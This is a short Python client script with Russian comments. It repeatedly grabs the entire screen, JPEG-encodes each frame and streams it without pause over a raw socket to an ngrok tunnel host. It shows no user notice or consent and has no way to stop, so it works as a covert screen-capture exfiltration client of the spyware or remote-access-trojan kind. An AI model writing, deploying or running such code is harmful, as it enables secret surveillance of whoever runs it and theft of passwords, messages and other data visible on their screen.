import socket
import numpy as np
from PIL import ImageGrab
import cv2  # Исправлено: импортируйте cv2 с маленькой буквы

def main():
    # Настройки клиента
    server_ip = '0.tcp.ngrok.io'  # IP-адрес сервера
    server_port = 11749            # Порт сервера

    # Создаем сокет
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    while True:
        # Захват изображения экрана
        img = ImageGrab.grab()
        img_np = np.array(img)

        # Кодируем изображение в JPEG
        _, img_encoded = cv2.imencode('.jpg', img_np)

        # Отправляем изображение на сервер
        client_socket.sendall(img_encoded.tobytes())

    client_socket.close()

if __name__ == "__main__":
    main()
